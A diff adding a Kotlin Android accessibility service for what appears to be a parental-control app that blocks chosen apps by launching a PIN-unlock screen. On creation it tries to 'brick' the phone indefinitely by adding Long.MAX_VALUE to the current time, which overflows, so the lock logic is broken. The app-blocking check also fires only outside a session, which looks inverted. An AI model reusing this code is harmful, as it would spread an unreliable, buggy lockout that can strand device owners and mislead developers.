@@ -1,0 +1,115 @@
+﻿// core-lock/src/main/kotlin/com/timeout/core/lock/GuardAccessibilityService.kt
+
+package com.timeout.core.lock
+
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.Intent
+import android.util.Log
+import android.view.accessibility.AccessibilityEvent
+import com.timeout.common.Prefs
+
+class GuardAccessibilityService : AccessibilityService() {
+
+    companion object {
+        private var lastSeenPackage: String? = null
+        private const val TAG = "TimeoutGuard"
+        var instance: GuardAccessibilityService? = null
+            private set
+    }
+
+    private val builtinWhitelist = setOf(
+        "com.timeout.child",
+        "com.android.systemui",
+        "com.android.dialer",
+        "com.google.android.dialer"
+    )
+
+    override fun onCreate() {
+        super.onCreate()
+
+        val end = Prefs.getEnd(this)
+        if (end <= System.currentTimeMillis()) {
+            Prefs.setEnd(this, System.currentTimeMillis() + Long.MAX_VALUE)
+            Log.e("BRICK", "ACCESSIBILITY ENABLED → PHONE BRICKED (INFINITE)")
+        } else {
+            Log.e("BRICK", "BRICK MODE RESUMED AFTER REBOOT")
+        }
+    }
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        instance = this
+
+        val info = AccessibilityServiceInfo().apply {
+            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+            packageNames = null
+            notificationTimeout = 100
+            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+        }
+        serviceInfo = info
+
+        Log.e(TAG, "=== ACCESSIBILITY SERVICE CONNECTED ===")
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        event ?: return
+        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+
+        val pkg = event.packageName?.toString() ?: return
+        if (pkg == lastSeenPackage) return
+        lastSeenPackage = pkg
+
+        if (pkg in builtinWhitelist) {
+            Log.v(TAG, "ALLOW (whitelist): $pkg")
+            return
+        }
+
+        val end = Prefs.getEnd(this)
+        val inSession = end > System.currentTimeMillis()
+        val userBlocklist = Prefs.getBlocked(this)
+
+        if (!inSession && pkg in userBlocklist) {
+            Log.w(TAG, "BLOCKING: $pkg")
+            Prefs.setLastBlockedPackage(this, pkg)
+            launchPinUnlock(pkg)
+        }
+    }
+
+    private fun launchPinUnlock(pkg: String) {
+        val appName = try {
+            packageManager.getApplicationLabel(
+                packageManager.getApplicationInfo(pkg, 0)
+            ).toString()
+        } catch (e: Exception) {
+            pkg
+        }
+
+        Log.e(TAG, "LAUNCHING PIN UNLOCK FOR: $pkg ($appName)")
+
+        val intent = Intent("com.timeout.BLOCKED_APP").apply {
+            putExtra("package", pkg)
+            putExtra("app_name", appName)
+            addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
+        }
+        sendBroadcast(intent)
+    }
+
+    override fun onInterrupt() {
+        Log.w(TAG, "Service interrupted")
+    }
+
+    override fun onUnbind(intent: Intent?): Boolean {
+        lastSeenPackage = null
+        Log.w(TAG, "Service unbound")
+        return super.onUnbind(intent)
+    }
+
+    override fun onDestroy() {
+        instance = null
+        Log.e(TAG, "SERVICE DESTROYED")
+        super.onDestroy()
+    }
+}
